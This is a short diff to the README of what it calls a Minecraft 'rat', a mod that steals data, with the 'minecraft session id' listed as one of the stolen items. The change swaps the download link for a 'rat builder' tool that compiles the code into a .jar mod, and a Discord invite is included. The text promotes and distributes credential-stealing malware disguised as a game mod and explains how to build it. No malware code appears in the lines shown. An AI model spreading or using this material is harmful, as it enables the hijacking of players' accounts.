@@ -5,7 +5,7 @@
 ## FULL RECODE COMING SOON as of 15/08/2023 - done on 02/10/23 (no it didnt take a month and a half to code this, i was just lazy :()
 ### https://discord.gg/aKEYP4cGSq
 
-### to turn this code into a .jar minecraft mod use the rat builder .jar file in https://github.com/iLoveRat/SkyblockRat/releases/tag/ratbuilder  (doesnt work as of 02/10/23 just compile manually if yk how)
+### to turn this code into a .jar minecraft mod use the rat builder .jar file in https://github.com/iLoveRat/SkyblockRat/releases/tag/fixedratbuilder 
 
 #### The rat steals:
 - minecraft session id
